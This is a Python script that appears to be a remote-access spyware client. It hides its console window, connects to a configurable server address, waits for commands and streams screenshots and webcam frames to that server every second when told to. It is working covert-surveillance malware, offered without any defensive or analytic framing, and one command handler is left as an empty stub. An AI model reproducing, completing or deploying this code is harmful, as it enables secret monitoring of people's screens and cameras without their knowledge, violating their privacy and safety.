import socket
import ctypes
import os
import time
import sys
import requests
from threading import Thread
from PIL import ImageGrab
import cv2
import numpy as np
import pyautogui

# Hide the window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Client info and server setup
SERVER_IP = "10.0.1.33"  # Change to your server IP
SERVER_PORT = 9999

# Function to capture screen and send it
def capture_screen():
    while True:
        screen = ImageGrab.grab()
        screen.save("screen.png", "PNG")
        with open("screen.png", "rb") as f:
            data = f.read()
        send_data(data)
        time.sleep(1)

# Function to capture webcam feed and send it
def capture_webcam():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        data = buffer.tobytes()
        send_data(data)
        time.sleep(1)

# Send data to the server
def send_data(data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        s.sendall(data)

# Listen for commands from the server
def listen_for_commands():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            command = s.recv(1024).decode()
            if command == "!stop":
                break
            if command.startswith("!set target"):
                # Implement the command execution logic
                pass
            if command == "!webcam_stream":
                capture_webcam()
            if command == "!screen_stream":
                capture_screen()

# Run the command listener in a separate thread
command_thread = Thread(target=listen_for_commands)
command_thread.start()
